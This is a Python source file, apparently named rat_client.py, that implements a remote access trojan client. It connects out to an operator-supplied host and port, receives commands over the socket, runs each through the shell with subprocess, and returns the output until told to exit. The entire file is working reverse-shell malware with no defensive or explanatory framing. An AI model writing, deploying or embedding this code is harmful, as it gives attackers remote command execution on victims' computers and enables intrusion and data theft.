import subprocess
import socket
import pickle
import sys

def connect(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    return sock

def execute_command(command):
    proc = subprocess.Popen(
        command,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    return proc.stdout.read() + proc.stderr.read()

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: python rat_client.py <host> <port>")
        sys.exit(1)
        
    try:
        host = sys.argv[1]
        port = int(sys.argv[2])
        sock = connect(host, port)
        
        while True:
            command = sock.recv(1024).decode()
            if command.lower() == 'exit':
                break
            result = execute_command(command)
            sock.send(result)
            
        sock.close()
    except Exception as e:
        print(f"Connection failed: {e}")